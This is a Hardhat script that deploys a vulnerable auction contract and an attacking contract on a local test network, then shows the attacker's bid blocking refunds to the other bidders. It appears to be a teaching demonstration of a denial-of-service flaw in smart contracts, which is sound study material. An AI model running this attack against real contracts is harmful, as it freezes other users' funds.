const hre = require('hardhat')
const ethers = hre.ethers

async function main() {
    const [user1, user2, hacker] = await ethers.getSigners()

    const DosAuction = await ethers.getContractFactory("DosAuction", user1)
    const auction = await DosAuction.deploy()
    await auction.deployed()

    const DosAttack = await ethers.getContractFactory("DosAttack", hacker)
    const attack = await DosAttack.deploy(auction.address)
    await attack.deployed()

    const txBid1 = await auction.bid({value: ethers.utils.parseEther("5")});
    txBid1.wait()

    const txAttack = await attack.doBid({value: 50})
    txAttack.wait()

    const txBid2 = await auction.connect(user2).bid({value: ethers.utils.parseEther("1")})
    txBid2.wait()

    console.log("Auction balance", await ethers.provider.getBalance(auction.address))

    try {
        const txRefund = await auction.refund()
        await txRefund.wait()
    } catch (e) {
        console.error(e)
    } finally {
        console.log("Refund progress", await auction.refundProgress())
        console.log("User1 balance", await ethers.provider.getBalance(user1.address))
        console.log("Hacker balance", await ethers.provider.getBalance(hacker.address))
        console.log("User2 balance", await ethers.provider.getBalance(user2.address))

    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })